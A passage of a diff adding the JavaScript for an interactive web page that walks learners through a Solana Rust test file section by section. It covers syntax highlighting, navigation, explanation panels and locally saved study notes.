+          codePart = codePart.replace(/(#\[.*?\])/g, '<span class="text-purple-400">$1</span>');
+
+          // Keywords
+          codePart = codePart.replace(
+            /\b(use|fn|let|mut|pub|struct|impl|true|false|Some|None)\b/g,
+            '<span class="text-cyber-purple font-medium">$1</span>'
+          );
+
+          // Macros (vec!, format!, assert!, println!)
+          codePart = codePart.replace(
+            /\b([a-zA-Z_][a-zA-Z0-9_]*!)/g,
+            '<span class="text-sky-400">$1</span>'
+          );
+
+          // Solana & Rust Types
+          codePart = codePart.replace(
+            /\b(LiteSVM|Account|Address|AccountMeta|Instruction|Keypair|Signer|Transaction|FromStr|String)\b/g,
+            '<span class="text-cyber-solana">$1</span>'
+          );
+
+          // Hex & Numeric literals
+          codePart = codePart.replace(
+            /\b(0x[0-9a-fA-F]+|[0-9][0-9_]*)\b/g,
+            '<span class="text-rose-300">$1</span>'
+          );
+
+          return codePart + commentPart;
+        })
+        .join('\n');
+    }
+
+    // Render top step pills and left interactive code blocks
+    function initApp() {
+      const pillsContainer = document.getElementById('stepPillsContainer');
+      const codeContainer = document.getElementById('interactiveCodeContainer');
+
+      pillsContainer.innerHTML = '';
+      codeContainer.innerHTML = '';
+
+      CODE_SECTIONS.forEach((sec, idx) => {
+        // 1. Render Top Quick-Jump Pill
+        const pill = document.createElement('button');
+        pill.id = `pill-${idx}`;
+        pill.textContent = sec.shortName;
+        pill.onclick = () => selectStep(idx, true);
+        pill.className =
+          'px-2.5 py-1 rounded-md text-xs font-mono border transition cursor-pointer';
+        pillsContainer.appendChild(pill);
+
+        // 2. Render Interactive Code Block Group
+        const block = document.createElement('div');
+        block.id = `code-block-${idx}`;
+        block.onclick = () => selectStep(idx, true);
+        block.className =
+          'code-block-group relative p-3.5 sm:p-4 cursor-pointer border-l-4 border-transparent hover:bg-cyber-hover/70';
+
+        // Build numbered lines
+        const rawLines = sec.code.split('\n');
+        const numberedLinesHtml = rawLines
+          .map((lineText, lineOffset) => {
+            const lineNum = sec.startLine + lineOffset;
+            return `<div class="flex">
+              <span class="w-8 sm:w-10 shrink-0 select-none text-zinc-600 text-right pr-3 sm:pr-4">${lineNum}</span>
+              <span class="whitespace-pre text-zinc-200">${highlightRust(lineText) || ' '}</span>
+            </div>`;
+          })
+          .join('');
+
+        block.innerHTML = `
+          <div class="flex items-center justify-between mb-1.5">
+            <span class="text-[11px] font-mono uppercase tracking-wider text-zinc-500 group-label">${sec.stepLabel}</span>
+            <span class="text-[11px] font-mono text-cyber-solana opacity-80 flex items-center gap-1">
+              <span>Inspect</span>
+              <i data-lucide="arrow-up-right" class="w-3 h-3"></i>
+            </span>
+          </div>
+          <div>${numberedLinesHtml}</div>
+        `;
+
+        codeContainer.appendChild(block);
+      });
+
+      // Populate full commented code modal
+      document.getElementById('fullCommentedCodeBlock').innerHTML = highlightRust(FULL_COMMENTED_RUST_FILE);
+
+      // Select initial section (Part 1) without auto-switching mobile tab
+      selectStep(0, false);
+
+      // Render Lucide icons
+      lucide.createIcons();
+    }
+
+    // Select and highlight a specific code section
+    function selectStep(index, autoSwitchOnMobile = false) {
+      currentIndex = index;
+      const sec = CODE_SECTIONS[index];
+
+      // Update Pills & Code Block Active Styles
+      CODE_SECTIONS.forEach((_, idx) => {
+        const pill = document.getElementById(`pill-${idx}`);
+        const block = document.getElementById(`code-block-${idx}`);
+
+        if (idx === index) {
+          pill.className =
+            'px-2.5 py-1 rounded-md text-xs font-mono border border-cyber-solana bg-cyber-solana/15 text-cyber-solana font-semibold transition cursor-pointer';
+          block.className =
+            'code-block-group relative p-3.5 sm:p-4 cursor-pointer border-l-4 border-cyber-solana bg-cyber-solana/[0.05]';
+        } else {
+          pill.className =
+            'px-2.5 py-1 rounded-md text-xs font-mono border border-cyber-border bg-zinc-900/70 text-zinc-400 hover:text-zinc-200 hover:border-zinc-600 transition cursor-pointer';
+          block.className =
+            'code-block-group relative p-3.5 sm:p-4 cursor-pointer border-l-4 border-transparent hover:bg-cyber-hover/60';
+        }
+      });
+
+      // Update Right Explanation Panel Content
+      document.getElementById('activeStepBadge').textContent = `Part ${index + 1} of ${CODE_SECTIONS.length}`;
+      document.getElementById('detailStepTag').textContent = sec.stepLabel;
+      document.getElementById('detailLinesTag').textContent = sec.lines;
+      document.getElementById('detailTitle').textContent = sec.title;
+      document.getElementById('detailSummary').textContent = sec.summary;
+
+      // Render Key Concepts
+      const conceptsContainer = document.getElementById('detailConcepts');
+      conceptsContainer.innerHTML = sec.concepts
+        .map(
+          (c) => `
+          <div class="rounded-lg bg-zinc-950/90 border border-cyber-border p-3">
+            <div class="font-mono text-xs font-semibold text-cyber-solana mb-1">${escapeHtml(c.term)}</div>
+            <p class="text-xs sm:text-[13px] text-zinc-300 leading-relaxed">${escapeHtml(c.desc)}</p>
+          </div>
+        `
+        )
+        .join('');
+
+      // Render Security Takeaway
+      document.getElementById('detailSecurityTitle').textContent = sec.security.title;
+      document.getElementById('detailSecurityBody').textContent = sec.security.body;
+
+      // Update Prev / Next Buttons
+      document.getElementById('prevBtn').disabled = index === 0;
+      document.getElementById('nextBtn').disabled = index === CODE_SECTIONS.length - 1;
+
+      // Load saved personal study notes from localStorage for this specific section
+      const savedNote = localStorage.getItem(`solana_lab_note_${sec.id}`) || '';
+      document.getElementById('personalNotesInput').value = savedNote;
+
+      // On mobile (< 1024px), tapping a code block automatically slides to the explanation view
+      if (autoSwitchOnMobile && window.innerWidth < 1024) {
+        switchMobileTab('explain');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      }
+    }
+
+    // Prev / Next button handler
+    function navigateStep(delta) {
+      const nextIdx = currentIndex + delta;
+      if (nextIdx >= 0 && nextIdx < CODE_SECTIONS.length) {
+        selectStep(nextIdx, false);
+      }
+    }
+
+    // Mobile Tab Switcher (Code vs. Explanation)
+    function switchMobileTab(tab) {
+      const codePane = document.getElementById('codePane');
+      const explainPane = document.getElementById('explanationPane');
+      const tabCodeBtn = document.getElementById('mobileTabCode');
+      const tabExplainBtn = document.getElementById('mobileTabExplain');
+
+      if (tab === 'code') {
+        codePane.classList.remove('hidden');
+        explainPane.classList.add('hidden');
+        tabCodeBtn.className =
+          'py-2.5 text-xs font-semibold flex items-center justify-center gap-2 border-b-2 border-cyber-solana text-cyber-solana transition';
+        tabExplainBtn.className =
+          'py-2.5 text-xs font-semibold flex items-center justify-center gap-2 border-b-2 border-transparent text-zinc-400 hover:text-zinc-200 transition';
+      } else {
+        codePane.classList.add('hidden');
+        explainPane.classList.remove('hidden');
+        tabExplainBtn.className =
+          'py-2.5 text-xs font-semibold flex items-center justify-center gap-2 border-b-2 border-cyber-solana text-cyber-solana transition';
+        tabCodeBtn.className =
+          'py-2.5 text-xs font-semibold flex items-center justify-center gap-2 border-b-2 border-transparent text-zinc-400 hover:text-zinc-200 transition';
+      }
+    }
+
+    // Auto-save personal study notes per section in localStorage
+    const notesTextarea = document.getElementById('personalNotesInput');
+    const savedIndicator = document.getElementById('noteSavedIndicator');
+    let saveTimeout;
+
+    notesTextarea.addEventListener('input', () => {
+      const secId = CODE_SECTIONS[currentIndex].id;
+      localStorage.setItem(`solana_lab_note_${secId}`, notesTextarea.value);
+
+      savedIndicator.classList.remove('opacity-0');
+      clearTimeout(saveTimeout);
+      saveTimeout = setTimeout(() => {
+        savedIndicator.classList.add('opacity-0');
+      }, 1500);
+    });
+
+    // Modal Controls for Full Commented File
+    const modal = document.getElementById('fullCodeModal');
+    document.getElementById('toggleFullCodeBtn').onclick = () => modal.classList.remove('hidden');
+    document.getElementById('closeModalBtn').onclick = () => modal.classList.add('hidden');
+    modal.onclick = (e) => {
+      if (e.target === modal) modal.classList.add('hidden');
+    };
+
+    function copyFullCommentedCode() {
+      navigator.clipboard.writeText(FULL_COMMENTED_RUST_FILE).then(() => {
+        const btnText = document.getElementById('copyBtnText');
+        btnText.textContent = 'Copied!';
+        setTimeout(() => {
+          btnText.textContent = 'Copy Code';
+        }, 1800);
+      });
+    }
+
+    // Boot application
+    initApp();
+  </script>
+</body>
+</html>
